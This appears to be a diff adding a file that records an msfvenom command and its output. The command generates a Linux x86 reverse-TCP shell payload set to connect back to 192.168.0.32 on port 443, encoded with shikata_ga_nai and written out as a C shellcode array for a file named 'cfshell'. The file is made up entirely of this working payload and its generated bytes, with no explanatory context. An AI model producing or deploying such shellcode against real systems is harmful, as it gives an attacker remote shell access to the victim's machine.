@@ -1,0 +1,18 @@
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.32 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00" >> cfshell
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+
+unsigned char buf[] = 
+"\xdb\xd3\xbf\x83\xe4\x07\x3b\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
+"\x12\x83\xc6\x04\x31\x7e\x13\x03\xfd\xf7\xe5\xce\x30\x23\x1e"
+"\xd3\x61\x90\xb2\x7e\x87\x9f\xd4\xcf\xe1\x52\x96\xa3\xb4\xdc"
+"\xa8\x0e\xc6\x54\xae\x69\xae\xa6\xf8\x8a\x0e\x4f\xfb\x8a\x4f"
+"\x34\x72\x6b\xff\x2c\xd5\x3d\xac\x03\xd6\x34\xb3\xa9\x59\x14"
+"\x5b\x5c\x75\xea\xf3\xc8\xa6\x23\x61\x60\x30\xd8\x37\x21\xcb"
+"\xfe\x07\xce\x06\x80";
